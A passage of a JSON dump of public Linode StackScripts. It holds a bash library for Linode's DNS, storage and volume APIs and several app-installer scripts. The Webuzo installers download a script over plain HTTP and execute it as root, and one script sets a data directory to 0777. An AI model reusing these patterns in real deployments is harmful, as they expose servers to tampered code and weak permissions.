      \"${domain_list[@]}\" | jq .data[$i].$property\n                break;\n                ;;\n        esac\n    done\n}\n\nfunction
      check_domain {\n    # Example: check_domain \"$DOMAIN\"\n\n    local -r domain=\"$1\"\n    if
      [ \"$(get_domain_property \"$domain\" ''domain'')\" ];\n        then return
      0;\n        else return 1;\n    fi\n}\n\nfunction get_record_id {\n    # Example:
      get_record_id \"$DOMAIN\" \"$SUBDOMAIN\" \"$TYPE\"\n\n    local -r domain=\"$1\"
      subdomain=\"$2\" type=\"$3\"\n    local -r domain_id=$(get_domain_property \"$domain\"
      ''id'')\n    local -a record_list=($(list_records \"$domain\"))\n    local -r
      num_records=$(echo \"${record_list[@]}\" | jq ''.results'')\n\n    for ((i=0;
      i<$num_records; i++)); do\n        local record_name=$(echo \"${record_list[@]}\"
      | jq .data[$i].name | sed ''s/\"//g'')\n        case \"$record_name\" in\n            \"$subdomain\")\n                local
      record_type=$(echo \"${record_list[@]}\" | jq .data[$i].type | sed ''s/\"//g'')\n                if
      [ \"$record_type\" == \"$type\" ]; then\n                    echo \"${record_list[@]}\"
      | jq .data[$i].id\n                    break;\n                fi\n                ;;\n        esac\n    done\n}\n\nfunction
      check_record {\n    # Example: check_record $DOMAIN $SUBDOMAIN $TYPE\n\n    local
      -r domain=\"$1\" subdomain=\"$2\" type=\"$3\"\n    local -r domain_id=$(get_domain_property
      \"$domain\" ''id'')\n    local -a record_list=($(list_records \"$domain\"))\n    local
      -r num_records=$(echo \"${record_list[@]}\" | jq ''.results'')\n\n    for ((i=0;
      i<$num_records; i++)); do\n        local record_name=$(echo \"${record_list[@]}\"
      | jq .data[$i].name | sed ''s/\"//g'')\n        case \"$record_name\" in \n            \"$subdomain\")\n                local
      record_type=$(echo \"${record_list[@]}\" | jq .data[$i].type | sed ''s/\"//g'')\n                if
      [ \"$record_type\" == \"$type\" ]; then\n                    local found_record=true\n                    break;\n                fi\n                ;;\n        esac\n    done\n\n    if
      [ \"$found_record\" ]; then\n        return 0;\n    else\n        return 1;\n    fi\n}\n\n##
      Create new DNS records\n\nfunction create_domain {\n    # Example: create_domain
      $DOMAIN $SOA_EMAIL_ADDRESS\n    \n    local -r domain=\"$1\" soa_email_address=\"$2\"\n\n    curl
      -H \"Content-Type: application/json\" \\\n         -H \"Authorization: Bearer
      $TOKEN_PASSWORD\" \\\n         -X POST -d ''{\n            \"domain\": \"''\"$domain\"''\",\n            \"type\":
      \"master\",\n            \"soa_email\": \"''\"$soa_email_address\"''\",\n            \"description\":
      \" \",\n            \"refresh_sec\": 14400,\n            \"retry_sec\": 3600,\n            \"expire_sec\":
      604800,\n            \"ttl_sec\": 300,\n            \"status\": \"active\",\n            \"display_group\":
      \" \"\n        }'' https://api.linode.com/v4/domains\n\n        # There''s a
      reason I added this, but it seems I didn''t leave a comment\n        # I''ll
      experiment with removing it later, but am leaving it for now in\n        # the
      interest of not breaking anything\n        sleep 3\n}\n\nfunction create_a_record
      {\n    # Example: create_a_record $SUBDOMAIN $IP $DOMAIN\n\n    local -r subdomain=\"$1\"
      ip_address=\"$2\" domain=\"$3\"\n    local -r domain_id=$(get_domain_property
      \"$domain\" ''id'')\n\n    curl -H \"Content-Type: application/json\" \\\n         -H
      \"Authorization: Bearer $TOKEN_PASSWORD\" \\\n         -X POST -d ''{\n            \"type\":
      \"A\",\n            \"name\": \"''\"$subdomain\"''\",\n            \"target\":
      \"''\"$ip_address\"''\",\n            \"priority\": 0,\n            \"service\":
      null,\n            \"protocol\": null\n        }'' https://api.linode.com/v4/domains/$domain_id/records\n\n}\n\nfunction
      create_aaaa_record {\n    # Example: create_aaaa_record $SUBDOMAIN $IP $DOMAIN\n\n    local
      -r subdomain=\"$1\" ip6_address=\"$2\" domain=\"$3\"\n    local -r domain_id=$(get_domain_property
      \"$domain\" ''id'')\n\n    curl -H \"Content-Type: application/json\" \\\n         -H
      \"Authorization: Bearer $TOKEN_PASSWORD\" \\\n         -X POST -d ''{\n            \"type\":
      \"AAAA\",\n            \"name\": \"''\"$subdomain\"''\",\n            \"target\":
      \"''\"$ip6_address\"''\",\n            \"priority\": 0,\n            \"service\":
      null,\n            \"protocol\": null\n        }'' https://api.linode.com/v4/domains/$domain_id/records\n}\n\nfunction
      create_mx_record {\n    # Example: create_mx_record $DOMAIN\n\n    local -r
      domain=\"$1\"\n    local -r domain_id=$(get_domain_property \"$domain\" ''id'')\n\n    curl
      -H \"Content-Type: application/json\" \\\n         -H \"Authorization: Bearer
      $TOKEN_PASSWORD\" \\\n         -X POST -d ''{\n            \"type\": \"MX\",\n            \"name\":
      \"''\"mail.${domain}\"''\",\n            \"target\": \"''\"$domain\"''\",\n            \"priority\":
      10,\n            \"service\": null,\n            \"protocol\": null,\n            \"ttl_sec\":
      0\n        }'' https://api.linode.com/v4/domains/$domain_id/records\n}\n\nfunction
      create_spf_record {\n    ## This function needs updating to allow the creation
      of custom SPF records\n\n    # Example create_spf_record $DOMAIN\n\n    local
      -r domain=\"$1\"\n    local -r domain_id=$(get_domain_property \"$domain\" ''id'')\n\n    curl
      -H \"Content-Type: application/json\" \\\n         -H \"Authorization: Bearer
      $TOKEN_PASSWORD\" \\\n         -X POST -d ''{\n            \"type\": \"TXT\",\n            \"name\":
      \"''\"$domain\"''\",\n            \"target\": \"v=spf1 a ~all\",\n            \"priority\":
      50,\n            \"ttl_sec\": 0\n    }'' https://api.linode.com/v4/domains/$domain_id/records\n}\n\nfunction
      set_rdns {\n    # Example: set_rdns $FQDN $IP\n\n    local -r fqdn=\"$1\" ip_address=\"$2\"\n\n    check_dns_propagation
      \"$fqdn\" \"$ip_address\"\n\n    printf \"Setting rDNS...\\n\"\n    curl -H
      \"Content-Type: application/json\" \\\n         -H \"Authorization: Bearer $TOKEN_PASSWORD\"
      \\\n         -X PUT -d ''{\n            \"rdns\": \"''\"$fqdn\"''\"\n        }''
      https://api.linode.com/v4/networking/ips/$ip_address\n}\n\n\n## Update existing
      DNS records\n\nfunction update_domain_property {\n    # Example: update_domain_property
      $DOMAIN $PROPERTIES_JSON\n\n    local -r domain=\"$1\"\n    local -r domain_id=\"$(get_domain_property
      \"$domain\" ''id'')\"\n\n    # Import the passed data into an associative array\n    local
      var=$(declare -p ${2})\n    eval \"local -a properties_json=\"${var#*=}\n\n    curl
      -H \"Content-Type: application/json\" \\\n         -H \"Authorization: Bearer
      $TOKEN_PASSWORD\" \\\n         -X PUT -d \"${properties_json}\" \\\n            https://api.linode.com/v4/domains/$domain_id\n}\n\nfunction
      update_a_record {\n    # Example: update_a_record $SUBDOMAIN $IP_ADDRESS $DOMAIN\n    \n    local
      -r subdomain=\"$1\" ip_address=\"$2\" domain=\"$3\"\n    local -r domain_id=$(get_domain_property
      \"$domain\" ''id'')\n    local -r record_id=$(get_record_id \"$domain\" \"$subdomain\"
      ''A'')\n\n    curl -H \"Content-Type: application/json\" \\\n         -H \"Authorization:
      Bearer $TOKEN_PASSWORD\" \\\n         -X PUT -d ''{\n         \"type\": \"A\",\n         \"name\":
      \"''\"$subdomain\"''\",\n         \"target\": \"''\"$ip_address\"''\"\n    }''
      https://api.linode.com/v4/domains/$domain_id/records/$record_id\n}\n\nfunction
      update_aaaa_record {\n    # Example: update_aaaa_record $SUBDOMAIN $IP6 $DOMAIN\n\n    local
      -r subdomain=\"$1\" ip6_address=\"$2\" domain=\"$3\"\n    local -r domain_id=$(get_domain_property
      \"$domain\" ''id'')\n    local -r record_id=$(get_record_id \"$domain\" \"$subdomain\"
      ''AAAA'')\n\n    curl -H \"Content-Type: application/json\" \\\n         -H
      \"Authorization: Bearer $TOKEN_PASSWORD\" \\\n         -X PUT -d ''{\n            \"type\":
      \"AAAA\",\n            \"name\": \"''\"$subdomain\"''\",\n            \"target\":
      \"''\"$ip6_address\"''\"\n    }'' https://api.linode.com/v4/domains/$domain_id/records/$record_id\n}\n\n\n##
      Automate DNS record creation\n#\n# *** IMPORTANT ***\n#\n# To use this next
      function, you''ll need to create an associative array outside of it to be passed
      in\n# Here''s an example:\n#\n# declare -A dns_records=(\n#    [soa_email_address]=\"$SOA_EMAIL_ADDRESS\"\n#    [domain]=\"$DOMAIN\"\n#    [subdomain]=\"www\"\n#    [mx_record]=''Yes''\n#    [spf_record]=''Yes''\n#
      )\n#\n# set_dns \"dns_records\"\n\nfunction set_dns {\n    # Import the passed
      data into an associative array\n    local var=$(declare -p ${1})\n    eval \"local
      -A records=\"${var#*=}\n\n    # Create the domain, if specified, and get it''s
      ID\n    # Also, create the A record for the base domain\n    if ! check_domain
      \"${records[domain]}\"; then\n        # Create the domain\n        create_domain
      \"${records[domain]}\" \"${records[email_address]}\"\n\n        # Create the
      base A record\n        create_a_record \"\" \"${records[ipv4_address]}\" \"${records[domain]}\"\n        create_aaaa_record
      \"\" \"${records[ipv6_address]}\" \"${records[domain]}\"\n    fi\n\n    # If
      the A record doesn''t already exist, create it\n    if ! check_record \"${records[domain]}\"
      \"${records[subdomain]}\" ''A''; then\n        create_a_record \"${records[subdomain]}\"
      \"${records[ipv4_address]}\" \"${records[domain]}\"\n    # Otherwise, update
      it\n    else\n        update_a_record \"${records[subdomain]}\" \"${records[ipv4_address]}\"
      \"${records[domain]}\"\n    fi\n\n    # If the AAAA record doesn''t exist, create
      it\n    if ! check_record \"${records[domain]}\" \"${records[subdomain]}\" ''AAAA'';
      then\n        create_aaaa_record \"${records[subdomain]}\" \"${records[ipv6_address]}\"
      \"${records[domain]}\"\n    # Otherwise, update it\n    else\n        update_aaaa_record
      \"${records[subdomain]}\" \"${records[ipv6_address]}\" \"${records[domain]}\"\n    fi\n\n    #
      Create an MX record, if requested\n    case \"${records[mx_record]}\" in\n        ''Yes'')\n            list_records
      \"${records[domain]}\" | grep ''MX''\n            [ $? -ne 0 ] && create_mx_record
      \"${records[domain]}\"\n            ;;\n    esac\n\n    # Create an SPF record,
      if requested\n    case \"${records[spf_record]}\" in\n        ''Yes'')\n            list_records
      \"${records[domain]}\" | grep ''spf''\n            [ $? -ne 0 ] && create_spf_record
      \"${records[domain]}\"\n            ;;\n    esac\n}\n\n\n## Verify DNS records\n\nfunction
      check_dns_propagation {\n    # Example: check_dns_propagation $FQDN $IP\n\n    local
      -r fqdn=\"$1\" ip_address=\"$2\"\n\n    # Check for ''dig'' and install ''dnsutils''
      if it''s not there\n    if ! dig; then\n        case \"${detected_distro[family]}\"
      in\n            ''debian'')\n                system_install_package dnsutils\n                ;;\n            ''redhat'')\n                system_install_package
      bind-utils\n                ;;\n        esac\n    fi\n\n    # List of nameservers
      to check\n    # Specifically, Google''s and Linode''s\n    local -a nameservers=(\n        ''8.8.4.4''\n        ''8.8.8.8''\n      #  ''162.159.27.72''\n      #  ''162.159.24.39''\n      #  ''162.159.25.129''\n      #  ''162.159.26.99''\n      #  ''162.159.24.25''\n    )\n\n    #
      Check for the record in each of the nameservers\n    # listed in ${nameservers[@]}\n    for
      i in ${nameservers[@]}; do\n        local a=1\n        printf \"Waiting for
      propagation to %s\" $i\n        while [ $a -gt 0 ]; do\n            result=\"$(dig
      @$i +short $fqdn)\"\n            if [ \"$result\" == \"$ip_address\" ]; then\n                ((a-=1))\n                result=''''\n            else\n                printf
      \".\"\n                sleep 10\n            fi\n        done\n        printf
      \"done.\\n\"\n    done\n\n    printf \"\\n%s has finished propagating!\\n\"
      $fqdn\n}\n\nfunction check_rdns_propagation {\n    # Example check_rdns_propagation
      $IP $DOMAIN\n\n    local -r ip_address=\"$1\" domain=\"$2\"\n    local a=1\n\n    while
      [ $a -ne 0 ]; do\n        if [ \"$(dig +short -x \"$ip_address\" | grep \"$domain\")\"
      ]; then\n            a=0\n        else\n            printf \".\"\n            sleep
      10\n        fi\n    done\n}\n\n\n\n##################################\n## Object
      Storage Buckets\n##################################\n\n## Create Object Storage
      Buckets\n\nfunction create_obj_bucket {\n    local -r bucket_name=\"$1\" cluster=\"$2\"
      acl=\"$3\" cors=\"$4\"\n\n    curl -H \"Content-Type: application/json\" \\\n         -H
      \"Authorization: Bearer $TOKEN_PASSWORD\" \\\n         -X POST -d ''{\n            \"label\":
      \"''\"$bucket_name\"''\",\n            \"cluster\": \"''\"$cluster\"''\",\n            \"cors_enabled\":
      ''$cors'',\n            \"acl\": \"''\"$acl\"''\"\n        }'' https://api.linode.com/v4/object-storage/buckets/\n}\n\n\n\n##################################\n##
      Block Storage Volumes\n##################################\n\n## List Block Storage
      Volumes\n\nfunction list_volumes {\n    # Example: list_volumes\n\n    curl
      -H \"Authorization: Bearer $TOKEN_PASSWORD\" \\\n        https://api.linode.com/v4/volumes
      | jq -S\n}\n\nfunction get_volume_property {\n    # Example: get_volume_property
      \"$VOLUME_LABEL\" \"$PROPERTY\"\n\n    local -r volume=\"$1\" property=\"$2\"\n    local
      -a volume_list=(\"$(list_volumes)\")\n    local -r num_volumes=$(echo \"${volume_list[@]}\"
      | jq ''.results'')\n\n    for ((i=0; i<$num_volumes; i++)); do\n        local
      volume_name=$(echo \"${volume_list[@]}\" | jq .data[$i].label | sed ''s/\"//g'')\n        case
      \"$volume_name\" in\n            \"$volume\")\n                echo \"${volume_list[@]}\"
      | jq .data[$i].$property\n                break;\n                ;;\n        esac\n    done\n}\n\nfunction
      check_volume {\n    # Example: check_volume \"$volume\"\n\n    local -r volume=\"$1\"\n    if
      [ $(get_volume_property \"$volume\" ''label'') ];\n        then return 0;\n        else
      return 1;\n    fi\n}\n\n\n## Create Block Storage Volumes\n\nfunction create_volume
      {\n    # Example: create_volume \"$VOLUME_LABEL\" $VOLUME_SIZE $LINODE_ID (optional)\n    #
      If you don''t specify a Linode ID, it will default to the current Linode\n\n    local
      -r label=\"$1\" size=\"$2\" linode_id=\"${3:-$LINODE_ID}\"\n\n    curl -H \"Content-Type:
      application/json\" \\\n         -H \"Authorization: Bearer $TOKEN_PASSWORD\"
      \\\n         -X POST -d ''{\n            \"label\": \"''\"$label\"''\",\n            \"size\":
      ''$size'',\n            \"linode_id\": ''$linode_id''\n        }'' https://api.linode.com/v4/volumes
      | jq -S\n}\n\n\n## Attach/Detach/Mount Block Storage Volumes\n\nfunction attach_volume
      {\n    # Example: attach_volume \"$VOLUME_LABEL\" $LINODE_ID (optional)\n    #
      If you don''t specify a Linode ID, it will default to the current Linode\n\n    local
      -r volume_label=\"$1\" linode_id=\"${2:-$LINODE_ID}\"\n    local -r volume_id=$(get_volume_property
      \"$volume_label\" ''id'')\n\n    curl -H \"Content-Type: application/json\"
      \\\n         -H \"Authorization: Bearer $TOKEN_PASSWORD\" \\\n         -X POST
      -d ''{\n            \"linode_id\": ''$linode_id''\n    }'' https://api.linode.com/v4/volumes/$volume_id/attach\n\n}\n\nfunction
      detach_volume {\n    # Example: detach_volume $VOLUME_ID\n\n    local -r volume_id=\"$1\"\n\n    curl
      -H \"Content-Type: application/json\" \\\n         -H \"Authorization: Bearer
      $TOKEN_PASSWORD\" \\\n         -X POST \\\n            https://api.linode.com/v4/volumes/$volume_id/detach\n\n}\n\nfunction
      mount_volume {\n    # Example: mount_volume \"$VOLUME_LABEL\" ''/path/to/mount_point''\n\n    local
      -r volume_label=\"$1\" mount_point=\"$2\"\n    local -r volume_path=\"$(\n        get_volume_property
      \"$volume_label\" ''filesystem_path'' | sed ''s/\"//g''\n    )\"\n\n    # Wait
      for the volume to become available before proceeding\n    local x=1\n    while
      [ $x -gt 0 ]; do\n        [ -e $volume_path ] && ((x-=1))\n        sleep 1\n    done\n\n    #
      Create a filesystem on the volume\n    mkfs.ext4 \"$volume_path\"\n\n    # Create
      \"$mount_point\" and mount the volume there\n    mkdir -p \"$mount_point\"\n    mount
      \"$volume_path\" \"$mount_point\"\n\n    # Automatically mount the volume at
      boot\n    echo \"$volume_path $mount_point ext4 defaults 0 2\" >> /etc/fstab\n}\n\n\nfunction
      delete_volume {\n    # Example: delete_volume $VOLUME_ID\n\n    local -r volume_id=\"$1\"\n\n    curl
      -H \"Content-Type: application/json\" \\\n         -H \"Authorization: Bearer
      $TOKEN_PASSWORD\" \\\n         -X DELETE \\\n            https://api.linode.com/v4/volumes/$volume_id\n}",
      "user_defined_fields": []}, {"id": 48408, "username": "crooksau", "user_gravatar_id":
      "f33d8e66bbce5c95fcb2a96dc8a4beaa", "label": "Debian 8 Install", "description":
      "Debian 8 Install for BODYRUBS.RU", "ordinal": 0, "logo_url": "", "images":
      ["linode/debian8"], "deployments_total": 0, "deployments_active": 0, "is_public":
      true, "mine": false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05",
      "rev_note": "Initial import", "script": "#!/bin/sh", "user_defined_fields":
      []}, {"id": 9241, "username": "webuzo", "user_gravatar_id": "cf0348f835d60e6d133040f49bb36ec5",
      "label": "Admidio powered by Webuzo", "description": "Admidio is a free online
      membership management, optimized for clubs, groups and organizations. It consists
      of classical management members from a variety of modules that can be installed
      and adjusted to a new or existing website.\r\n\r\nRegistered users have your
      website by Admidio including access to predefined and user-configurable membership
      lists, people profiles and an Agenda. In addition, members may be pooled in
      groups are assigned properties and search for it.\r\n\r\nWebuzo is a Single
      User Control Panel which helps users deploy Web Apps (WordPress, Joomla, Drupal,
      etc) or System Apps (Apache, NGINX, PHP, Java, MongoDB, etc) on their virtual
      machines or in the cloud.\r\n\r\nYou can get a Webuzo License here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath
      to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion
      of the installation process, access http://your-ip:2004 to configure Admidio
      and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "Admidio powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
      label=\"Premium Webuzo License Key\" example=\"WEBUZO-XXXXX-XXXXX-XXXXX\"/>\n\n###########################################################################################################\n#
      Install Admidio and Softaculous Webuzo\n# Description -\n# About Webuzo :\n#   Webuzo
      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
      Joomla, Drupal, etc)\n#   or System Apps (Apache, NGINX, PHP, Java, MongoDB,
      etc) on their virtual machines or in the cloud.\n#\n# About Admidio :\n#   Admidio
      is a free online membership management, optimized for clubs, groups and organizations.\n#   It
      consists of classical management members from a variety of modules that can
      be installed \n#   and adjusted to a new or existing website.\n###########################################################################################################\n\n#
      Install Admidio Script using Webuzo\nfunction install_webuzo_script(){\n   \n    #
      Install Webuzo\n    install_webuzo\n   \n    wget http://files.webuzo.com/ip.php
      >> /root/webuzo-install.log 2>&1\n    ip=$(cat ip.php)\n   \n    /usr/local/emps/bin/curl
      \"http://$ip:2004/install.php?prepareinstall=449&license=$1\"\n   \n}\n\n# Install
      Webuzo Function\nfunction install_webuzo(){\n       \n    # Fetch the Webuzo
      Installer\n    wget -N http://files.webuzo.com/install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Modify Permissions\n    chmod 0755 install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Execute\n    ./install.sh >> /root/webuzo-install.log 2>&1\n   \n    #
      Clean Up\n    rm -rf install.sh >> /root/webuzo-install.log 2>&1\n   \n}\n\n#########################################################\n#\tInstalling
      Admidio and Softaculous Webuzo\n#########################################################\n\ninstall_webuzo_script
      $WEBUZO_LICENSE_KEY\n\n# Check the return of the above command and display the
      result accordingly\n\necho \" \"\necho \"-------------------------------------\"\necho
      \" Installation Completed \"\necho \"-------------------------------------\"\necho
      \"Congratulations, Admidio has been successfully installed\"\necho \" \"\necho
      \"You can now configure Admidio and Softaculous Webuzo at the following URL
      :\"\necho \"http://$ip:2004/\"\necho \" \"\necho \"Thank you for choosing Softaculous
      Webuzo !\"\necho \" \"", "user_defined_fields": []}, {"id": 12825, "username":
      "bozuslu", "user_gravatar_id": "67f0a5d0710560fd85e82a39cc71a567", "label":
      "bayram", "description": "Ek 2", "ordinal": 0, "logo_url": "", "images": ["linode/debian7"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "Initial import", "script": "#!/bin/bash", "user_defined_fields": []}, {"id":
      9242, "username": "webuzo", "user_gravatar_id": "cf0348f835d60e6d133040f49bb36ec5",
      "label": "MeshCMS powered by Webuzo", "description": "MeshCMS is an online editing
      system written in Java. It provides a set of features usually included in a
      CMS, but it uses a more traditional approach: pages are stored in regular HTML
      files and all additional features are file-based, without needing a database.\r\n\r\nMeshCMS
      has been thought as a quick tool to edit pages online, manage files and create
      some common components like menus, breadcrumbs, mail forms, image galleries
      and so on.\r\n\r\nWebuzo is a Single User Control Panel which helps users deploy
      Web Apps (WordPress, Joomla, Drupal, etc) or System Apps (Apache, NGINX, PHP,
      Java, MongoDB, etc) on their virtual machines or in the cloud.\r\n\r\nYou can
      get a Webuzo License here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath to Installation
      Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion of the
      installation process, access http://your-ip:2004 to configure MeshCMS and Softaculous
      Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact", "ordinal": 0,
      "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "MeshCMS powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
      label=\"Premium Webuzo License Key\" example=\"WEBUZO-XXXXX-XXXXX-XXXXX\"/>\n\n###########################################################################################################\n#
      Install MeshCMS and Softaculous Webuzo\n# Description -\n# About Webuzo :\n#   Webuzo
      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
      Joomla, Drupal, etc)\n#   or System Apps (Apache, NGINX, PHP, Java, MongoDB,
      etc) on their virtual machines or in the cloud.\n#\n# About MeshCMS :\n#   MeshCMS
      is an online editing system written in Java.\n#   It provides a set of features
      usually included in a CMS, but it uses a more traditional approach: pages \n#   are
      stored in regular HTML files and all additional features are file-based, without
      needing a database.\n###########################################################################################################\n\n#
      Install MeshCMS Script using Webuzo\nfunction install_webuzo_script(){\n   \n    #
      Install Webuzo\n    install_webuzo\n   \n    wget http://files.webuzo.com/ip.php
      >> /root/webuzo-install.log 2>&1\n    ip=$(cat ip.php)\n   \n    /usr/local/emps/bin/curl
      \"http://$ip:2004/install.php?prepareinstall=385&license=$1\"\n   \n}\n\n# Install
      Webuzo Function\nfunction install_webuzo(){\n       \n    # Fetch the Webuzo
      Installer\n    wget -N http://files.webuzo.com/install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Modify Permissions\n    chmod 0755 install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Execute\n    ./install.sh >> /root/webuzo-install.log 2>&1\n   \n    #
      Clean Up\n    rm -rf install.sh >> /root/webuzo-install.log 2>&1\n   \n}\n\n#########################################################\n#\tInstalling
      MeshCMS and Softaculous Webuzo\n#########################################################\n\ninstall_webuzo_script
      $WEBUZO_LICENSE_KEY\n\n# Check the return of the above command and display the
      result accordingly\n\necho \" \"\necho \"-------------------------------------\"\necho
      \" Installation Completed \"\necho \"-------------------------------------\"\necho
      \"Congratulations, MeshCMS has been successfully installed\"\necho \" \"\necho
      \"You can now configure MeshCMS and Softaculous Webuzo at the following URL
      :\"\necho \"http://$ip:2004/\"\necho \" \"\necho \"Thank you for choosing Softaculous
      Webuzo !\"\necho \" \"", "user_defined_fields": []}, {"id": 1193754, "username":
      "jrzavaschi1992", "user_gravatar_id": "6c0262d5482846284b510b579df19fdd", "label":
      "Illa Builder One-Click", "description": "Illa Builder One-Click App", "ordinal":
      0, "logo_url": "", "images": ["linode/ubuntu22.04"], "deployments_total": 0,
      "deployments_active": 0, "is_public": true, "mine": false, "created": "2018-01-02T03:04:05",
      "updated": "2018-01-02T03:04:05", "rev_note": "", "script": "#!/bin/bash\n#<UDF
      name=\"PORT\" Label=\"ILLA Builder Port\" example=\"Default: 80\" default=\"80\"
      />\n#<UDF name=\"PG_PASSWORD\" Label=\"Postgres Password\" example=\"s3cure_p4ssw0rd\"
      /> \n\n## Enable logging \nexec > >(tee /dev/ttyS0 /var/log/stackscript.log)
      2>&1\n\n# Apt update/upgrade\napt update\napt upgrade -y\n\n# Install the dependencies
      & add Docker to the APT repository\napt install -y apt-transport-https ca-certificates
      curl software-properties-common gnupg2 pwgen ufw\ncurl -fsSL https://download.docker.com/linux/ubuntu/gpg
      | apt-key add -\nadd-apt-repository \"deb [arch=amd64] https://download.docker.com/linux/ubuntu
      focal stable\"\n\n# Update & install Docker-CE\napt update\napt install -y docker-ce\n\n#
      Check to ensure Docker is running and installed correctly\nsystemctl status
      docker\ndocker -v\n\n# Env config\nILLA_HOME_DIR=/var/lib/illa\nPG_VOLUMN=${ILLA_HOME_DIR}/database/postgresql\nWSS_ENABLED=false\nILLA_DEPLOY_MODE=''self-host''\n\n\n#
      Init\nmkdir -p ${ILLA_HOME_DIR}\nmkdir -p ${PG_VOLUMN}\nmkdir -p ${ILLA_HOME_DIR}\nchmod
      0777 ${PG_VOLUMN} # @todo: chmod for MacOS, the gid is \"wheel\", not \"root\".
      and we will fix this later.\n\n# Run\ndocker run -d \\\n    --name illa-builder
      \\\n    -e POSTGRES_PASSWORD=$PG_PASSWORD \\\n    -e GIN_MODE=release \\\n    -e
      PGDATA=/var/lib/postgresql/data/pgdata \\\n    -e ILLA_DEPLOY_MODE=$ILLA_DEPLOY_MODE
      \\\n    -v $PG_VOLUMN:/var/lib/postgresql/data \\\n    -p $PORT:80 \\\n    illasoft/illa-builder:latest\n\necho
      \"\n********************************************************************************\nWelcome
      to ILLA Builder!\n********************************************************************************\n  #
      Website:           https://www.illacloud.com\n  # Documentation:     https://www.illacloud.com/docs/about-illa\n  #
      Github:            https://github.com/illacloud\n  # Community Support: https://github.com/orgs/illacloud/discussions\"",
      "user_defined_fields": [{"name": "PORT", "label": "ILLA Builder Port", "example":
      "Default: 80", "default": "80"}, {"name": "PG_PASSWORD", "label": "Postgres
      Password", "example": "s3cure_p4ssw0rd"}]}, {"id": 14362, "username": "ezan",
      "user_gravatar_id": "40bba314333f02cceb3f40d8a2aabb78", "label": "install-sensu",
      "description": "", "ordinal": 0, "logo_url": "", "images": ["linode/ubuntu14.04lts"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "Initial import", "script": "#!/bin/bash\n##\n# Installs the Sensu omnibus package\n#\n#
      This package contains all of the different Sensu components. Use specific scripts\n#
      to configure each component on different nodes.\n##\nset -eux\n\nsource env.sh\n\n$BASE_PATH/configure-repo-sensu.sh\n\napt-get
      install -yq sensu", "user_defined_fields": []}, {"id": 9243, "username": "webuzo",
      "user_gravatar_id": "cf0348f835d60e6d133040f49bb36ec5", "label": "Little Software
      Stats powered by Webuzo", "description": "Little Software Stats is a web application
      that allows users to monitor their software.\r\n\r\nLittle Software Stats is
      the first runtime intelligence software released as open source and free. It
      is designed and developed through MySQL and PHP which will allow most web servers
      to run it. Little Software Stats allows users to collect information including
      executions, installations, exceptions, and geographical location.\r\n\r\nWebuzo
      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
      Joomla, Drupal, etc) or System Apps (Apache, NGINX, PHP, Java, MongoDB, etc)
      on their virtual machines or in the cloud.\r\n\r\nYou can get a Webuzo License
      here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn
      completion of the installation process, access http://your-ip:2004 to configure
      Little Software Stats and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "Little Software Stats powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
      label=\"Premium Webuzo License Key\" example=\"WEBUZO-XXXXX-XXXXX-XXXXX\"/>\n\n###########################################################################################################\n#
      Install Little Software Stats and Softaculous Webuzo\n# Description -\n# About
      Webuzo :\n#   Webuzo is a Single User Control Panel which helps users deploy
      Web Apps (WordPress, Joomla, Drupal, etc)\n#   or System Apps (Apache, NGINX,
      PHP, Java, MongoDB, etc) on their virtual machines or in the cloud.\n#\n# About
      Little Software Stats :\n#   Little Software Stats is a web application that
      allows users to monitor their software.\n#   Little Software Stats is the first
      runtime intelligence software released as open source and free.\n#   It is designed
      and developed through MySQL and PHP which will allow most web servers to run
      it.\n#   Little Software Stats allows users to collect information including
      executions, \n#   installations, exceptions, and geographical location.\n###########################################################################################################\n\n#
      Install Little Software Stats Script using Webuzo\nfunction install_webuzo_script(){\n   \n    #
      Install Webuzo\n    install_webuzo\n   \n    wget http://files.webuzo.com/ip.php
      >> /root/webuzo-install.log 2>&1\n    ip=$(cat ip.php)\n   \n    /usr/local/emps/bin/curl
      \"http://$ip:2004/install.php?prepareinstall=444&license=$1\"\n   \n}\n\n# Install
